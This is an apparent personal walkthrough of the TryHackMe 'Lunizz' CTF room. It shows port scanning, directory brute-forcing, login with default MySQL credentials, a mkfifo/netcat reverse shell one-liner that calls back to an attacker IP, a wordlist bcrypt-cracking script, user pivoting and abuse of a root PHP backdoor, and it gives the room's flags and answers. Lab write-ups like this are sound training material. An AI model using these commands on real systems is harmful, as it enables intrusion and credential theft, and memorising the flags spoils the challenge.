![](https://cdn.pixabay.com/photo/2016/11/08/05/20/adventure-1807524_960_720.jpg)

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/9ae7a76f89ebbb00ec6ef240268804bc.png)

### Are you able to solve this challenge?

 Start Machine

10.10.72.102

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.72.102 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.72.102:80
Open 10.10.72.102:3306
Open 10.10.72.102:4444
Open 10.10.72.102:5000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-17 10:27 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:27
Completed NSE at 10:27, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:27
Completed NSE at 10:27, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:27
Completed NSE at 10:27, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:27
Completed Parallel DNS resolution of 1 host. at 10:27, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:27
Scanning 10.10.72.102 [4 ports]
Discovered open port 80/tcp on 10.10.72.102
Discovered open port 3306/tcp on 10.10.72.102
Discovered open port 4444/tcp on 10.10.72.102
Discovered open port 5000/tcp on 10.10.72.102
Completed Connect Scan at 10:27, 0.25s elapsed (4 total ports)
Initiating Service scan at 10:27
Scanning 4 services on 10.10.72.102
Completed Service scan at 10:27, 6.76s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.72.102.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:27
Completed NSE at 10:27, 6.34s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:27
Completed NSE at 10:27, 3.86s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:27
Completed NSE at 10:27, 0.00s elapsed
Nmap scan report for 10.10.72.102
Host is up, received user-set (0.25s latency).
Scanned at 2023-04-17 10:27:27 EDT for 18s

PORT     STATE SERVICE    REASON  VERSION
80/tcp   open  http       syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
3306/tcp open  mysql      syn-ack MySQL 5.7.33-0ubuntu0.18.04.1
| ssl-cert: Subject: commonName=MySQL_Server_5.7.33_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_5.7.33_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-02-11T23:12:30
| Not valid after:  2031-02-09T23:12:30
| MD5:   0b701b5f166e426932e301be40f8f6e7
| SHA-1: 2866e1efd2809bcf6cecb15c27b7af15cde1f92b
| -----BEGIN CERTIFICATE-----
| MIIDBzCCAe+gAwIBAgIBAjANBgkqhkiG9w0BAQsFADA8MTowOAYDVQQDDDFNeVNR
| TF9TZXJ2ZXJfNS43LjMzX0F1dG9fR2VuZXJhdGVkX0NBX0NlcnRpZmljYXRlMB4X
| DTIxMDIxMTIzMTIzMFoXDTMxMDIwOTIzMTIzMFowQDE+MDwGA1UEAww1TXlTUUxf
| U2VydmVyXzUuNy4zM19BdXRvX0dlbmVyYXRlZF9TZXJ2ZXJfQ2VydGlmaWNhdGUw
| ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDRCvq9/K5fEQO0juxe6NG4
| zjV1A5DR/lgWgraEiLmYANxmlN4MY6dy79NnaeCI8fRSjergQIJzFbNWc5mfm6NC
| E3eaLq2X9eN7+KdR2q7VNjJ/fF3D7k4ewa0GnBNGbC2AyoYrFKXxAN6qGU831qU4
| aMNcNCAXcJqqF4rW+3Vjlj8h2/ZkYkRJsVUEz5k6esNYRsVPu7JSFkRLE4lV8Xg9
| vL9arCA9BgR4sE1FqI7mA9DLUcoEZlJXwgl67oad5sxW+GPuZeUF4jF583C8vBhN
| WRtHWPytjQLe69N8BTthbdabtyQI2HMBEGSEDF6U2AJj8OiC3AXUs3L9p//hL/1p
| AgMBAAGjEDAOMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBAHPpnm2k
| 2U9nkklYcE0M2LEWyQE8IJozVMLMZ3KvuTF49+eUGXUeEvoJQnOi6P5ELvc57gGY
| 5QcAdpmqAbdE6vA1jnvK825LCl/L1zpsqXpkj4gu5Znavl2Rs0wXvhGhlj3PlNQu
| SKoSi+s729CulT6OU+JV9NDIOQlzoSfHCHo02t0D006dnx1ko1J/CtWqFi6mPF8u
| jqb87kTDBtMPXEO9OKrWKKjxBBQlVAIgu+VAn3TfeEX5moOZO84Uv7ul6GuJ2Xg3
| J4tSOB1aj0YJcgRXPbYXXf8AgOnMMXv18ZW1x49P5Yro58JyjioZiY7d9bHArRy5
| nuBjGrsuWRNAqBM=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.33-0ubuntu0.18.04.1
|   Thread ID: 6
|   Capabilities flags: 65535
|   Some Capabilities: LongPassword, Support41Auth, IgnoreSigpipes, FoundRows, ConnectWithDatabase, LongColumnFlag, ODBCClient, InteractiveClient, Speaks41ProtocolOld, SwitchToSSLAfterHandshake, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, SupportsCompression, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, SupportsTransactions, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: is\x17x\x03@1<?Hp6\x08px&3E [
|_  Auth Plugin Name: mysql_native_password
4444/tcp open  tcpwrapped syn-ack
5000/tcp open  tcpwrapped syn-ack

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:27
Completed NSE at 10:27, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:27
Completed NSE at 10:27, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:27
Completed NSE at 10:27, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.30 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ nc 10.10.72.102 4444    
Can you decode this for me?
bGV0bWVpbg==
letmein
root@lunizz:# id
FATAL ERROR

┌──(witty㉿kali)-[~/Downloads]
└─$ echo 'bGV0bWVpbg==' | base64 -d
letmein 

┌──(witty㉿kali)-[~/Downloads]
└─$ nc 10.10.72.102 5000
OpenSSH 5.1
Unable to load config info from /usr/local/ssl/openssl.cnf 

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.72.102/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.72.102/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/04/17 10:35:15 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.72.102/hidden               (Status: 301) [Size: 313] [--> http://10.10.72.102/hidden/]
http://10.10.72.102/whatever             (Status: 301) [Size: 315] [--> http://10.10.72.102/whatever/]
http://10.10.72.102/server-status        (Status: 403) [Size: 277]

http://10.10.72.102/whatever/index.php
Command Executer Mode :0
ls

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.72.102/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.72.102/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/04/17 10:57:03 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.72.102/instructions.txt     (Status: 200) [Size: 339]

┌──(witty㉿kali)-[~/Downloads]
└─$ curl http://10.10.72.102/instructions.txt
Made By CTF_SCRIPTS_CAVE (not real)

Thanks for installing our ctf script

#Steps
- Create a mysql user (runcheck:CTF_script_cave_changeme)
- Change necessary lines of config.php file

Done you can start using ctf script

#Notes
please do not use default creds (IT'S DANGEROUS) <<<<<<<<<---------------------------- READ THIS LINE PLEASE

┌──(witty㉿kali)-[~/Downloads]
└─$ mysql -h 10.10.72.102 -uruncheck -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 19
Server version: 5.7.33-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| runornot           |
+--------------------+
2 rows in set (0.277 sec)

MySQL [(none)]> use runornot;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [runornot]> show tables;
+--------------------+
| Tables_in_runornot |
+--------------------+
| runcheck           |
+--------------------+
1 row in set (0.343 sec)

MySQL [runornot]> describe runcheck;
+-------+---------+------+-----+---------+-------+
| Field | Type    | Null | Key | Default | Extra |
+-------+---------+------+-----+---------+-------+
| run   | int(11) | YES  |     | NULL    |       |
+-------+---------+------+-----+---------+-------+
1 row in set (0.284 sec)

MySQL [runornot]> select run from runcheck;
+------+
| run  |
+------+
|    0 |
+------+
1 row in set (0.299 sec)

https://www.guru99.com/sql-update-query.html#:~:text=MySQL%20Update%20Command%20Syntax&text=UPDATE%20%60table_name%60%20is%20the%20command,must%20be%20in%20single%20quotes.

MySQL [runornot]> UPDATE runcheck SET run = 1;
Query OK, 1 row affected (0.305 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MySQL [runornot]> select run from runcheck;
+------+
| run  |
+------+
|    1 |
+------+
1 row in set (0.238 sec)
MySQL [runornot]> exit;
Bye


command executer : which nc
Command Executer Mode :1
/bin/nc 

revshell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.19.103 1337 >/tmp/f

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.72.102] 54396
bash: cannot set terminal process group (965): Inappropriate ioctl for device
bash: no job control in this shell
www-data@lunizz:/var/www/html/whatever$ python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@lunizz:/proct/pass$ cd /var/backups/.script
cd /var/backups/.script
www-data@lunizz:/var/backups/.script$ ls
ls
fakessh.log  runasroot.log  runasroot.py  ssh.py
www-data@lunizz:/var/backups/.script$ cat runasroot.py
cat runasroot.py
import socket
import base64
import random

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 4444))
s.listen(5)

passarray = ["extremehardrootpassword", "extremesecurerootpassword", "p@ssword", "letmein", "randompassword"]

while True:
        c, addr = s.accept()
        with open("/var/backups/.script/runasroot.log", "a") as f:
                f.write("Connection Accepted From {}\n".format(addr))
        choice = random.choice(passarray)
        passwd = base64.b64encode(choice.encode())
        c.sendall(b"Can you decode this for me?\n")
        c.sendall(passwd + b"\n")
        with open("/var/backups/.script/runasroot.log", "a") as f:
                f.write("Password Sent, Password :{}\n".format(choice))
        getpasswd = c.recv(4096)
        with open("/var/backups/.script/runasroot.log", "a") as f:
                f.write("Client Sent Password :{}\n".format(getpasswd.decode()))
        if choice == getpasswd.decode().strip():
                c.sendall(b"root@lunizz:# ")
                c.recv(4096)
                c.sendall(b"FATAL ERROR")
        else:
                c.sendall(b"Wrong Password")
                c.close()

www-data@lunizz:/var/backups/.script$ cat ssh.py
cat ssh.py
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 5000))
s.listen(5)

while True:
        c, addr = s.accept()
        with open("/var/backups/.script/fakessh.log", "a") as f:
                f.write("Bamboozled Client :{}\n".format(addr))
        c.sendall(b"OpenSSH 5.1\n")
        c.sendall(b"Unable to load config info from /usr/local/ssl/openssl.cnf")
        c.close()

www-data@lunizz:/var/www/html/whatever$ ls -lah /
ls -lah /
total 1.8G
drwxr-xr-x  25 root root 4.0K Mar 25  2021 .
drwxr-xr-x  25 root root 4.0K Mar 25  2021 ..
drwxr-xr-x   2 root root 4.0K Feb 10  2021 bin
drwxr-xr-x   4 root root 4.0K Apr  7  2021 boot
drwxr-xr-x   2 root root 4.0K Feb  9  2021 cdrom
drwxr-xr-x  18 root root 3.7K Apr 17 14:25 dev
drwxr-xr-x  96 root root 4.0K Apr  7  2021 etc
drwxr-xr-x   4 root root 4.0K Feb 28  2021 home
lrwxrwxrwx   1 root root   34 Mar 25  2021 initrd.img -> boot/initrd.img-4.15.0-139-generic
lrwxrwxrwx   1 root root   34 Mar 25  2021 initrd.img.old -> boot/initrd.img-4.15.0-136-generic
drwxr-xr-x  22 root root 4.0K Feb 11  2021 lib
drwxr-xr-x   2 root root 4.0K Feb 10  2021 lib64
drwx------   2 root root  16K Feb  9  2021 lost+found
drwxr-xr-x   2 root root 4.0K Aug  6  2020 media
drwxr-xr-x   2 root root 4.0K Aug  6  2020 mnt
drwxr-xr-x   2 root root 4.0K Aug  6  2020 opt
dr-xr-xr-x 116 root root    0 Apr 17 14:24 proc
drwxr-xr-x   3 adam adam 4.0K Feb 28  2021 proct
drwx------   6 root root 4.0K Feb 28  2021 root
drwxr-xr-x  26 root root  840 Apr 17 14:30 run
drwxr-xr-x   2 root root  12K Feb 10  2021 sbin
drwxr-xr-x   2 root root 4.0K Feb  9  2021 snap
drwxr-xr-x   2 root root 4.0K Aug  6  2020 srv
-rw-------   1 root root 1.8G Feb  9  2021 swap.img
dr-xr-xr-x  13 root root    0 Apr 17 14:24 sys
drwxrwxrwt   2 root root 4.0K Apr 17 15:06 tmp
drwxr-xr-x  10 root root 4.0K Aug  6  2020 usr
drwxr-xr-x  14 root root 4.0K Feb 28  2021 var
lrwxrwxrwx   1 root root   31 Mar 25  2021 vmlinuz -> boot/vmlinuz-4.15.0-139-generic
lrwxrwxrwx   1 root root   31 Mar 25  2021 vmlinuz.old -> boot/vmlinuz-4.15.0-136-generic
www-data@lunizz:/var/www/html/whatever$ cd /
cd /
www-data@lunizz:/$ cd proct
cd proct
www-data@lunizz:/proct$ ls
ls
pass
www-data@lunizz:/proct$ cd pass
cd pass
www-data@lunizz:/proct/pass$ ls
ls
bcrypt_encryption.py

or

www-data@lunizz:/proct/pass$ ls -lahR /proct
ls -lahR /proct
/proct:
total 12K
drwxr-xr-x  3 adam adam 4.0K Feb 28  2021 .
drwxr-xr-x 25 root root 4.0K Mar 25  2021 ..
drwxr-xr-x  2 adam adam 4.0K Feb 28  2021 pass

/proct/pass:
total 12K
drwxr-xr-x 2 adam adam 4.0K Feb 28  2021 .
drwxr-xr-x 3 adam adam 4.0K Feb 28  2021 ..
-rw-r--r-- 1 adam adam  273 Feb 28  2021 bcrypt_encryption.py


www-data@lunizz:/proct/pass$ cat bcrypt_encryption.py
cat bcrypt_encryption.py
import bcrypt
import base64

passw = "wewillROCKYOU".encode('ascii')
b64str = base64.b64encode(passw)
hashAndSalt = bcrypt.hashpw(b64str, bcrypt.gensalt())
print(hashAndSalt)

#hashAndSalt = b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e'
#bcrypt.checkpw()

www-data@lunizz:/proct/pass$ cat /etc/passwd | grep /bin/sh
cat /etc/passwd | grep /bin/sh
adam:x:1000:1000::/home/adam:/bin/sh
mason:x:1001:1001::/home/mason:/bin/sh

https://en.wikipedia.org/wiki/Bcrypt

$2<a/b/x/y>$[cost]$[22 character salt][31 character hash]

For example, with input password `abc123xyz`, cost `12`, and a random salt, the output of bcrypt is the string

$2a$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW
\__/\/ \____________________/\_____________________________/
Alg Cost      Salt                        Hash

Where:

-   `$2a$`: The hash algorithm identifier (bcrypt)
-   `12`: Input cost (212 i.e. 4096 rounds)
-   `R9h/cIPz0gi.URNNX3kh2O`: A base-64 encoding of the input salt
-   `PST9/PgBkqquzi.Ss7KIUgO2t0jWMUW`: A base-64 encoding of the first 23 bytes of the computed 24 byte hash

The base-64 encoding in bcrypt uses the table `./ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789`,[[10]](https://en.wikipedia.org/wiki/Bcrypt#cite_note-bcrypt.c_lines_57-58-10) which is different than [RFC](https://en.wikipedia.org/wiki/RFC_(identifier) "RFC (identifier)") [4648](https://datatracker.ietf.org/doc/html/rfc4648) [Base64](https://en.wikipedia.org/wiki/Base64 "Base64") encoding.

so our bcrypt will be

$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e
\__/\/ \____________________/\_____________________________/
Alg Cost      Salt                        Hash

┌──(witty㉿kali)-[~/Downloads]
└─$ cat crack_bcrypt.py
#!/usr/bin/env python3

import bcrypt
import base64

salt = b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.'
bcrypt_hash = b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e'

with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as f:
	for word in f.readlines():
		passw = word.strip().encode('ascii', 'ignore')
		b64str = base64.b64encode(passw)
		hashAndSalt = bcrypt.hashpw(b64str, salt)
		print('\r', end='') 
		print(f'[*] Cracking hash: {hashAndSalt}', end='')

		if bcrypt_hash == hashAndSalt:
			print('\n[+] Cracked!')
			print(f'[+] Before hashed: {passw}')
			print(f'[+] After hashed: {hashAndSalt}')
			exit()

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 crack_bcrypt.py
[*] Cracking hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e'
[+] Cracked!
[+] Before hashed: b'bowwow'
[+] After hashed: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e'

www-data@lunizz:/var/backups/.script$ su adam
su adam
Password: bowwow

$ bash
bash

adam@lunizz:~$ find / -user adam 2>/dev/null | grep -v "/proct/\|/proc/\|/run/\|/sys/\|/var/"
<ll | grep -v "/proct/\|/proc/\|/run/\|/sys/\|/var/"
/proct
/home/adam
/home/adam/.gnupg
/home/adam/.gnupg/private-keys-v1.d
/home/adam/Desktop
/home/adam/Desktop/.archive
/home/adam/Desktop/.archive/to_my_best_friend_adam.txt
/home/adam/Downloads
/home/adam/.bashrc
/home/adam/.bash_logout
/home/adam/.profile

adam@lunizz:~$ cd /home/adam/Desktop/.archive/
cd /home/adam/Desktop/.archive/
adam@lunizz:~/Desktop/.archive$ ls
ls
to_my_best_friend_adam.txt
adam@lunizz:~/Desktop/.archive$ cat to_my_best_friend_adam.txt
cat to_my_best_friend_adam.txt
do you remember our place 
i love there it's soo calming
i will make that lights my password

--

https://www.google.com/maps/@68.5090469,27.481808,3a,75y,313.8h,103.6t/data=!3m6!1e1!3m4!1skJPO1zlKRtMAAAQZLDcQIQ!3e2!7i10000!8i5000

adam@lunizz:~/Desktop/.archive$ su mason
su mason
Password: northernlights

$ bash
bash
mason@lunizz:/home/adam/Desktop/.archive$ cd /home/mason
cd /home/mason
mason@lunizz:~$ ls
ls
user.txt
mason@lunizz:~$ cat user.txt
cat user.txt
thm{23cd53cbb37a37a74d4425b703d91883}

mason@lunizz:~$ netstat -tulpn
netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      1152/python3        
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      1146/python3        
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                  
Backdoor

mason@lunizz:~$ curl http://127.0.0.1:8080
curl http://127.0.0.1:8080
**********************************************************
*                Mason's Root Backdoor                   *
*                                                        *
*   Please Send Request (with "password" and "cmdtype")  *
*                                                        *
**********************************************************
-------------CMD TYPES-------------
lsla
reboot
passwd

mason@lunizz:~$ curl http://127.0.0.1:8080 -X POST
curl http://127.0.0.1:8080 -X POST
Wrong Password [your place ;)]!! 
**********************************************************
*                Mason's Root Backdoor                   *
*                                                        *
*   Please Send Request (with "password" and "cmdtype")  *
*                                                        *
**********************************************************
-------------CMD TYPES-------------
lsla
reboot
passwd

mason@lunizz:~$ ps aux | grep 127.0.0.1
ps aux | grep 127.0.0.1
root       878  0.0  0.0   4636    64 ?        Ss   14:26   0:00 /bin/sh -c php -S 127.0.0.1:8080 -t /root/
root       879  0.0  1.8 273660  9248 ?        S    14:26   0:00 php -S 127.0.0.1:8080 -t /root/
mason     2406  0.0  0.2  13144  1108 pts/1    S+   16:35   0:00 grep --color=auto 127.0.0.1
mason@lunizz:~$ curl http://127.0.0.1:8080 -X POST -d 'password=northernlights&cmdtype=lsla'
<0 -X POST -d 'password=northernlights&cmdtype=lsla'
total 44
drwx------  6 root root 4096 Feb 28  2021 .
drwxr-xr-x 25 root root 4096 Mar 25  2021 ..
lrwxrwxrwx  1 root root    9 Feb 10  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3771 Feb 10  2021 .bashrc
drwx------  3 root root 4096 Feb 12  2021 .cache
drwx------  3 root root 4096 Feb 12  2021 .gnupg
-rw-r--r--  1 root root 1044 Feb 28  2021 index.php
drwxr-xr-x  3 root root 4096 Feb  9  2021 .local
lrwxrwxrwx  1 root root    9 Feb 11  2021 .mysql_history -> /dev/null
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r-----  1 root root   38 Feb 28  2021 r00t.txt
-rw-r--r--  1 root root   66 Feb 28  2021 .selected_editor
drwx------  2 root root 4096 Feb  9  2021 .ssh
**********************************************************
*                Mason's Root Backdoor                   *
*                                                        *
*   Please Send Request (with "password" and "cmdtype")  *
*                                                        *
**********************************************************
-------------CMD TYPES-------------
lsla
reboot
passwd

mason@lunizz:~$ curl http://127.0.0.1:8080 -X POST -d 'password=northernlights&cmdtype=passwd'
<-X POST -d 'password=northernlights&cmdtype=passwd'
<br>Password Changed To :northernlights<br>**********************************************************
*                Mason's Root Backdoor                   *
*                                                        *
*   Please Send Request (with "password" and "cmdtype")  *
*                                                        *
**********************************************************
-------------CMD TYPES-------------
lsla
reboot
passwd

mason@lunizz:~$ su -
su -
Password: northernlights

root@lunizz:~# cd /root
cd /root
root@lunizz:~# ls
ls
index.php  r00t.txt
root@lunizz:~# cat index.php
cat index.php
<?php
if ($_SERVER['REQUEST_METHOD'] == "POST") {
        if (isset($_POST['password']) and $_POST['password'] == "northernlights") {
                if (isset($_POST['cmdtype'])) {
                        if ($_POST['cmdtype'] == "passwd") { system("echo -n 'northernlights\nnorthernlights' | passwd"); echo "<br>Password Changed To :northernlights<br>"; }
                        if ($_POST['cmdtype'] == "lsla") { system("ls -al /root"); }
                        if ($_POST['cmdtype'] == "reboot") { system("reboot"); }
                }
        } else {
                echo "Wrong Password [your place ;)]!! \n";
        }
}
?>
**********************************************************
*                Mason's Root Backdoor                   *
*                                                        *
*   Please Send Request (with "password" and "cmdtype")  *
*                                                        *
**********************************************************
-------------CMD TYPES-------------
lsla
reboot
passwd

root@lunizz:~# cat r00t.txt
cat r00t.txt
thm{ad23b9c63602960371b50c7a697265db}

Was really fun :)

```

![[Pasted image 20230417095525.png]]

![[Pasted image 20230417100518.png]]

![[Pasted image 20230417112614.png]]

What is the default password for mysql  

admin forgot to delete a .txt file that contains credentials. can you find it

*CTF_script_cave_changeme*

I can't run commands, there must be a mysql column that controls command executer

*run*

a folder shouldn't be...

/ 

*proct*

hi adam, do you remember our place?

it's gorgeous looks like mason loves that place. He loves it so much that he changed his password

*Northern Lights*

user.txt

*thm{23cd53cbb37a37a74d4425b703d91883}*

root.txt

mason made a backdoor to root. so silly,

**


[[Bookstore]]